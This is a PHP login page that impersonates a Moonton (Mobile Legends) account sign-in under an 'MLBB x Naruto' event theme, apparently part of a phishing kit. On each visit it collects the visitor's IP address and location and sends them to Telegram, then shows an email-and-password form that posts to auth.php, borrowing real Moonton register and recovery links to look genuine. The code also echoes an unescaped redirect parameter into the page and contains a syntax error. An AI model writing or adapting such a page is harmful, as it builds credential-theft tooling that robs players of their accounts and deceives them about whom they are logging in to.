<?php
session_start();
include 'includes/config.php';
include 'includes/functions.php';

// Jika sudah login, redirect ke profile
if (isset($_SESSION['moonton_loggedin']) {
    header("Location: profile.php");
    exit;
}

// Log akses halaman login
$ip = getUserIP();
$asn = getASN($ip);
$city = getCity($ip);
$country = getCountry($ip);
sendToTelegram("Login Page Accessed - IP: $ip | Location: $city, $country");

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Moonton Account - MLBB x Naruto</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <style>
        .login-container {
            max-width: 400px;
            margin: 50px auto;
            padding: 30px;
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
        }
        
        .login-logo {
            text-align: center;
            margin-bottom: 25px;
        }
        
        .login-logo img {
            height: 60px;
        }
        
        .login-title {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
            font-size: 1.5em;
        }
        
        .login-form .form-group {
            margin-bottom: 20px;
        }
        
        .login-form label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #555;
        }
        
        .login-form input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
            transition: border 0.3s;
        }
        
        .login-form input:focus {
            border-color: #3498db;
            outline: none;
        }
        
        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #e74c3c;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        
        .login-btn:hover {
            background-color: #c0392b;
        }
        
        .login-footer {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #777;
        }
        
        .login-footer a {
            color: #3498db;
            text-decoration: none;
        }
        
        .login-footer a:hover {
            text-decoration: underline;
        }
        
        .error-message {
            color: #e74c3c;
            text-align: center;
            margin-bottom: 20px;
            padding: 10px;
            background-color: #fdecea;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-logo">
            <img src="assets/images/moonton-logo.png" alt="Moonton">
        </div>
        
        <h2 class="login-title">Login to Your Moonton Account</h2>
        
        <?php if (isset($_GET['error'])): ?>
            <div class="error-message">
                Invalid email or password. Please try again.
            </div>
        <?php endif; ?>
        
        <form class="login-form" action="auth.php" method="POST">
            <input type="hidden" name="redirect" value="<?= $_GET['redirect'] ?? 'profile.php' ?>">
            
            <div class="form-group">
                <label for="email">Email or Username</label>
                <input type="text" id="email" name="email" required autofocus>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <button type="submit" class="login-btn">LOGIN</button>
        </form>
        
        <div class="login-footer">
            <p>Don't have an account? <a href="https://account.mobilelegends.com/register" target="_blank">Register</a></p>
            <p><a href="https://account.mobilelegends.com/forgot-password" target="_blank">Forgot Password?</a></p>
        </div>
    </div>
</body>
</html>
